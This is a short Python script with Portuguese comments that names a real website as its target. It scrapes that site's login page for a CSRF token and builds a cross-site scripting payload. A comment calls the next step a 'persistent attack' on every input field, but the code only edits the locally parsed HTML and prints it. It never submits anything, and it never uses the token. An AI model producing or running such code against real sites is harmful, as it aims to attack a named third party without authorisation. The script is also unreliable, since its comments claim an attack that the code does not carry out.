import requests
from bs4 import BeautifulSoup

# URL do site-alvo
url = 'https://cbl.org.br/'

# Enviar solicitação GET para a página de login
response = requests.get(url)

# Extrair o token CSRF da página
soup = BeautifulSoup(response.text, 'html.parser')
csrf_input = soup.find('input', {'name': 'csrf_token'})
if csrf_input is not None:
    csrf_token = csrf_input['value']
else:
    print('Erro: token CSRF não encontrado.')

# Criar o payload de XSS personalizado
xss_payload = "<script>alert('XSS')</script>"

# Ataque persistente: injete o payload personalizado em cada campo de entrada
for input_field in soup.find_all('input'):
    if input_field.has_attr('name'):
        if input_field.has_attr('value'):
            input_field['value'] = input_field['value'] + xss_payload
        else:
            input_field['value'] = xss_payload

# Exibir o código HTML modificado
print(soup.prettify())
